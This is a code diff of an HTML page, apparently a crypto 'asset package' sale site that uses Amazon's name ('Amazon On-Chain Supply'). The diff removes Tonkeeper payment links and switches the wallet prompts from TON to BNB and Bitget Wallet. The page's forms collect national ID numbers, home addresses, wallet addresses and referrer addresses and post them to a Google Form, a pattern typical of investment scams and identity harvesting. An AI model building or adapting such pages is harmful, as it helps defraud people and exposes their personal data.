@@ -223,7 +223,6 @@
             <p><b id="t-m1-p1"></b><span id="t-m1-p1-note"></span></p>
             <p><b id="t-m1-p2">全网释放中资产包</b>：2690 <span id="t-m1-p2-note">(包含原始资产包与合成资产包)</span></p>
         </div>
-        <button class="btn" onclick="openModal('buyModal')" id="t-buy-btn">购买原始资产包</button>
     </div>
 
     <div class="nav-grid">
@@ -257,36 +256,23 @@
     </div>
 
     <div class="glass-card">
-        <img src="https://img.freepik.com/premium-photo/toncoin-ton-blue-coin-3d-rendering-front-view-cryptocurrency-illustration-cartoon-style_477250-349.jpg" class="icon-circle">
+        <img src="https://cdn-icons-png.freepik.com/512/12114/12114208.png" class="icon-circle">
         <div class="nav-grid" style="flex-wrap: wrap; width: 100%; margin: 0;">
             <a href="http://www.fosal.fit/ait/page2" class="btn" style="width: 48%;" id="t-whitepaper">白皮书</a>
-            <a href="https://ton.org/" class="btn" style="width: 48%;">TON</a>
-            <a href="https://tonkeeper.com/" class="btn" style="width: 48%;">Tonkeeper</a>
-            <a href="https://tonviewer.com/" class="btn" style="width: 48%;" id="t-explorer">区块链浏览器</a>
+            <a href="https://web3.bitget.com/" class="btn" style="width: 48%;">Bitget Wallet</a>
+            <a href="https://bscscan.com/" class="btn" style="width: 48%;" id="t-explorer">区块链浏览器</a>
         </div>
     </div>
 
     <footer id="t-footer">© 2026 Amazon On-Chain Supply. All Rights Reserved.</footer>
 </div>
 
-<div id="buyModal" class="modal" onclick="closeModal(event, 'buyModal')">
-    <div class="glass-card modal-content" onclick="event.stopPropagation()">
-        <h3 id="t-buy-opt-title">选择购买数量</h3>
-        <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=150000000" class="btn">1 Unit (150M)</a>
-        <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=750000000" class="btn">5 Units (750M)</a>
-        <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=1500000000" class="btn">10 Units (1.5B)</a>
-        <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=3000000000" class="btn">20 Units (3B)</a>
-        <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=7500000000" class="btn">50 Units (7.5B)</a>
-        <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=15000000000" class="btn">100 Units (15B)</a>
-    </div>
-</div>
-
 <div id="walletModal" class="modal" onclick="closeModal(event, 'walletModal')">
     <div class="glass-card modal-content" onclick="event.stopPropagation()">
         <h3 id="t-wallet-modal-title">绑定钱包</h3>
         <form id="googleFormWallet">
-            <input type="text" id="ipt-wallet" placeholder="请在此输入您的Ton钱包地址" required>
-            <input type="text" id="ipt-ref" placeholder="请在此输入您的推荐人的Ton地址" required>
+            <input type="text" id="ipt-wallet" placeholder="请在此输入您的BNB钱包地址" required>
+            <input type="text" id="ipt-ref" placeholder="请在此输入您的推荐人的BNB地址" required>
             <button type="submit" class="btn" id="t-submit-1">提交</button>
             <p style="font-size: 0.7rem;" id="t-warn-1">请勿重复提交此表单</p>
         </form>
@@ -303,7 +289,7 @@
             <input type="text" placeholder="证件号码" id="ipt-id" required>
             <input type="text" placeholder="国家或地区" id="ipt-country" required>
             <input type="text" placeholder="详细地址" id="ipt-detail" required>
-            <input type="text" placeholder="Tonkeeper地址" id="ipt-ton" required>
+            <input type="text" placeholder="bnb地址" id="ipt-ton" required>
             <button type="submit" class="btn" id="t-submit-2">提交</button>
             <p style="font-size: 0.7rem;" id="t-warn-2">请勿重复提交此表单</p>
         </form>
@@ -555,7 +541,7 @@ document.getElementById('googleFormAddr').onsubmit = function(e) {
     formData.append('entry.918113529', document.getElementById('ipt-id').value);      // 证件号码
     formData.append('entry.660848111', document.getElementById('ipt-country').value); // 国家或地区
     formData.append('entry.1364418281', document.getElementById('ipt-detail').value);  // 详细地址
-    formData.append('entry.1917004091', document.getElementById('ipt-ton').value);     // Tonkeeper钱包地址
+    formData.append('entry.1917004091', document.getElementById('ipt-ton').value);     // bnb钱包地址
 
     // 3. 执行提交
     fetch(actionUrl, {
@@ -580,3 +566,4 @@ document.getElementById('googleFormAddr').onsubmit = function(e) {
 </script>
 </body>
 </html>
+
